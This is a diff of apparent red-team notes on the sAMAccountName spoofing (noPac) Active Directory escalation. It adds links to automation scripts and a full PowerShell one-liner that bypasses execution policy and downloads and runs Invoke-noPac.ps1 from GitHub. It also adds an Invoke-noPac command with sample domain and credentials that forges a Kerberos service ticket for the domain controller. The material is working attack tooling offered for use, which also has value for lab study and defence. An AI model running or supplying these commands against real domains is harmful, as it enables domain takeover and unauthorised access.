@@ -88,28 +88,26 @@ dir \\dc.domain.com\c$
 
 @@@@@@@
 
-automated script on my github:
+My automated script on my github:
+https://github.com/IAMinZoho/sAMAccountName-Spoofing/blob/main/AutomatesAMAccountNameSpoof.ps1
 
-https://github.com/IAMinZoho/sAMAccountName-Spoofing
-
+Requires the tools.zip to be unzipped in Downloads and change Domain and Domain Controller name on the script and then run to simulate the attack!
 
 @@@@@@@@@@@@@
 
-ANOTHER AUTOMATION:
+ANOTHER AUTOMATION (using Invoke-noPac script):
 
 https://gist.github.com/S3cur3Th1sSh1t/0ed2fb0b5ae485b68cbc50e89581baa6
 
-IEX:
+IEX: (on unelevated powershell)
+
 Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/IAMinZoho/sAMAccountName-Spoofing/main/Invoke-noPac.ps1'))
 
+then,
+Invoke-noPac -command "-domain mitnick.in -user Bob -pass user@123 /dc mndc.mitnick.in /mAccount ControlledComputer /mPassword Password123 /service cifs /ptt"
 
 Read about invoke-nopac from:
 https://pentestlab.blog/2022/01/10/domain-escalation-samaccountname-spoofing/
-
-Run in unelevated powershell:
-
-Invoke-noPac -command "-domain mitnick.in -user Bob -pass user@123 /dc mndc.mitnick.in /mAccount ControlledComputer /mPassword Password123 /service cifs /ptt"
-
 
 @@@@@@@@@@@@@@@@@@@@@@@@
 
